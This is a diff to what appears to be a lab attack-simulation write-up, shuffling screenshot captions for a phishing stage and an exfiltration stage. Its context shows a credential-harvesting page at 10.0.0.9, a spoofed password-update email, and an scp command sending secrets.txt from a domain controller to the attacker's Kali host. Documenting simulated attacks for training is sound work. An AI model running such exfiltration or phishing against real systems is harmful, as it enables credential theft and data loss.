@@ -106,6 +106,8 @@ sudo service apache2 start
 
 ![Attacker's fake "Verify Your Password" credential-harvesting page hosted at http://10.0.0.9 — identical look to a legitimate corporate portal](../screenshots/attack-simulation/fake_verify_page_example.png)
 
+![Example of stolen data](../screenshots/attack-simulation/stolen_data_example.png)
+
 ### Send the Phishing Email
 
 Using the compromised corporate server as a trusted email relay, the attacker sends a spoofed "Update Password!" email impersonating the ProjectX Security Team:
@@ -216,9 +218,7 @@ scp ".\secrets.txt" kali@10.0.0.9:/home/kali/secrets.txt
 
 ![SCP transfer from DC PowerShell — secrets.txt sent to kali@10.0.0.9 — 100% transfer confirmed at 2.6KB/s](../screenshots/attack-simulation/scp_exfiltration_secrets.png)
 
-![Attacker verifies file received on Kali — cat secrets.txt returns the stolen contents](../screenshots/attack-simulation/scp_exfiltration_result.png)
-
-![Contents of secrets.txt: $PROJECT-SP{123HELLO} — sensitive production credential/flag data successfully exfiltrated](../screenshots/attack-simulation/stolen_data_example.png)
+![Contents of secrets.txt: $PROJECT-SP{123HELLO} — sensitive production credential/flag data successfully exfiltrated](../screenshots/attack-simulation/scp_exfiltration_result.png)
 
 ---
 
